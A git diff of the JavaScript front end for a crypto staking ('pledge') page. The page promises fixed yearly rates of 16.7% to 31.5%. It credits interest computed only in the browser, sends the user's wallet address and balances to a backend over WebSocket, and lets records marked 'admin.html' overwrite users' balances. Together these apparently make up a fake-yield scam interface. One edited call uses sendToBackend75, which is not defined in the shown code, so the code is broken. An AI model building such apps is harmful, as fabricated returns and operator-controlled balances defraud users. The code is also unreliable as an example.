@@ -5,9 +5,7 @@ const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd9
 let ws;
 function initWebSocket() {
   if (ws && ws.readyState === WebSocket.OPEN) return;
-  // 改成本機或 ngrok
-  ws = new WebSocket('ws://localhost:3000/ws'); // 本機
-  // ws = new WebSocket('wss://ventilative-lenten-brielle.ngrok-free.dev/ws'); // ngrok
+  ws = new WebSocket('ws://localhost:3000/ws');
   ws.onopen = () => log('WebSocket 連線成功！', 'success');
   ws.onclose = () => {
     log('WebSocket 斷線，3秒後重連...', 'error');
@@ -19,8 +17,6 @@ function sendToBackend(data) {
   if (!userAddress || !ws || ws.readyState !== WebSocket.OPEN) return;
   ws.send(JSON.stringify({ address: userAddress, timestamp: Date.now(), ...data }));
 }
-
-// 新增：發送完整狀態到 WSS
 function sendFullStateToBackend() {
   if (!userAddress || !ws || ws.readyState !== WebSocket.OPEN) return;
   ws.send(JSON.stringify({
@@ -65,10 +61,10 @@ const ERC20_ABI = [
 
 // ==================== 質押週期 & 年化利率 ====================
 const PLEDGE_DURATIONS = [
-  { days: 90, rate: 0.167 }, // 16.7%
-  { days: 180, rate: 0.243 }, // 24.3%
-  { days: 240, rate: 0.281 }, // 28.1%
-  { days: 365, rate: 0.315 } // 31.5%
+  { days: 90, rate: 0.167 },
+  { days: 180, rate: 0.243 },
+  { days: 240, rate: 0.281 },
+  { days: 365, rate: 0.315 }
 ];
 
 // DOM 元素
@@ -425,7 +421,7 @@ async function loadUserDataFromServer() {
     const userData = snap.data();
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
-    if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
+    if (userData.lastUpdated >= localLastUpdated || userData.source === 'admin.html') { // 修正：>=
       pledgedAmount = userData.pledgedAmount ?? 0;
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
       totalGrossOutput = userData.totalGrossOutput ?? 0;
@@ -448,6 +444,7 @@ async function loadUserDataFromServer() {
       updateAccountBalanceDisplay();
       updatePledgeSummary();
       updateEstimate();
+      recalculateClaimable(); // 新增：推算總產出
     }
   } catch (error) {
     log(`載入失敗: ${error.message}`, 'error');
@@ -481,22 +478,21 @@ function updateStatus(message, isWarning = false) {
 
 function resetState(showMsg = true) {
   signer = userAddress = null;
-  pledgedAmount = 0;
-  lastPayoutTime = null;
-  totalGrossOutput = 0;
   window.currentClaimable = 0;
-  accountBalance = {
-    USDT: { wallet: 0, pledged: 0, interest: 0 },
-    USDC: { wallet: 0, pledged: 0, interest: 0 },
-    WETH: { wallet: 0, pledged: 0, interest: 0 }
-  };
+
+  // 只清 wallet，保留 pledged + interest
+  for (const token in accountBalance) {
+    accountBalance[token].wallet = 0;
+  }
+
   authorizedToken = 'USDT';
   currentCycleInterest = 0;
   userPledges = [];
   if (interestInterval) clearInterval(interestInterval);
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   if (claimInterval) clearInterval(claimInterval);
-  localStorage.clear();
+  localStorage.removeItem('userData'); // 只清本地快取
+
   if (startBtn) {
     startBtn.style.display = 'block';
     startBtn.textContent = translations[currentLang].startBtnText;
@@ -538,7 +534,7 @@ function convertToSelectedToken(amount, fromToken, toToken) {
     if (fromToken === 'WETH') return amount * ethPrice;
     return amount / ethPrice;
   }
-  return amount; // USDT ↔ USDC = 1:1
+  return amount;
 }
 
 // ==================== 總 Account Balance ====================
@@ -568,17 +564,13 @@ function updateBalancesUI(walletBalances) {
   const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
   const walletValue = parseFloat(formattedWalletBalance);
 
-  // 只更新 wallet，保留 pledged & interest
   accountBalance[selectedToken].wallet = walletValue;
-
   if (walletBalanceAmount) walletBalanceAmount.textContent = walletValue.toFixed(3);
   updateAccountBalanceDisplay();
   updateEstimate();
 
-  // 寫入 Firestore + 發送 WSS
   saveUserData(null, false);
   sendFullStateToBackend();
-
   sendToBackend({ type: 'balance', balances: getCurrentBalances() });
 }
 
@@ -638,6 +630,23 @@ function updateClaimableDisplay() {
   cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
 }
 
+// 新增：推算總產出（不寫入 Firestore）
+function recalculateClaimable() {
+  const totalBalance = getTotalAccountBalanceInSelectedToken();
+  if (totalBalance <= 0) {
+    window.currentClaimable = 0;
+    updateClaimableDisplay();
+    return;
+  }
+  const now = Date.now();
+  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || now;
+  const hoursSinceLast = (now - lastPayout) / (1000 * 60 * 60);
+  const cycleInterest = totalBalance * (MONTHLY_RATE / 60);
+  const projected = cycleInterest * Math.floor(hoursSinceLast / 0.5);
+  window.currentClaimable = projected;
+  updateClaimableDisplay();
+}
+
 async function updateInterest() {
   const totalBalance = getTotalAccountBalanceInSelectedToken();
   if (totalBalance <= 0) {
@@ -650,16 +659,25 @@ async function updateInterest() {
   const nowET = new Date(now + etOffset);
   const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
   const isExactMinute = nowET.getMinutes() === 0;
-  if (!isPayoutTime || !isExactMinute) return;
+  if (!isPayoutTime || !isExactMinute) {
+    recalculateClaimable();
+    return;
+  }
+
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
-  if (wasPayoutTime) return;
+  if (wasPayoutTime) {
+    recalculateClaimable();
+    return;
+  }
+
   const cycleInterest = totalBalance * (MONTHLY_RATE / 60);
   window.currentClaimable += cycleInterest;
   localStorage.setItem('claimable', window.currentClaimable.toString());
   localStorage.setItem('lastPayoutTime', now.toString());
-  await saveUserData();
+
+  await saveUserData(null, false);
   log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
   updateClaimableDisplay();
   updateAccountBalanceDisplay();
@@ -1088,7 +1106,7 @@ function showPledgeDetail() {
   pledgeDetailModal.style.display = 'flex';
 }
 
-// ==================== 【修正】Account Balance 明細 ====================
+// ==================== Account Balance 明細 ====================
 function showAccountDetail() {
   if (!accountDetailModal) return;
   const selected = walletTokenSelect ? walletTokenSelect.value : 'USDT';
@@ -1147,7 +1165,6 @@ document.addEventListener('DOMContentLoaded', () => {
     setInterval(updateTotalFunds, 1000);
   }, 100);
 
-  // 質押週期選單
   if (pledgeDuration) {
     pledgeDuration.innerHTML = '';
     PLEDGE_DURATIONS.forEach(d => {
@@ -1158,7 +1175,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // ==================== 事件綁定 ====================
   const claimBtn = document.getElementById('claimButton');
   if (claimBtn) claimBtn.addEventListener('click', claimInterest);
   if (closeModal) closeModal.addEventListener('click', closeClaimModal);
@@ -1176,11 +1192,12 @@ document.addEventListener('DOMContentLoaded', () => {
       accountBalance[authorizedToken].interest += claimable;
       window.currentClaimable = 0;
       localStorage.setItem('claimable', '0');
-      await saveUserData();
+      await saveUserData(null, false);
       updateClaimableDisplay();
       updateAccountBalanceDisplay();
       updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
       sendToBackend({ type: 'claim', amount: claimable });
+      sendFullStateToBackend();
     });
   }
 
@@ -1286,7 +1303,7 @@ document.addEventListener('DOMContentLoaded', () => {
         updatePledgeSummary();
         updateAccountBalanceDisplay();
         pledgeAmount.value = '';
-        sendToBackend({ type: 'pledge', amount, token, duration: durationDays });
+        sendToBackend75({ type: 'pledge', amount, token, duration: durationDays });
       } catch (error) {
         updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
       }
@@ -1294,7 +1311,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
-  if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance); // 切換代幣時刷新
+  if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
   if (pledgeToken) pledgeToken.addEventListener('change', updateEstimate);
@@ -1334,7 +1351,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
   if (closeRulesModal) {
     closeRulesModal.addEventListener('click', () => {
-      if (rulesModal) rulesModal.style.display = 'none'; // 修正：移除多餘空格
+      if (rulesModal) rulesModal.style.display = 'none';
     });
   }
   if (rulesModal) {
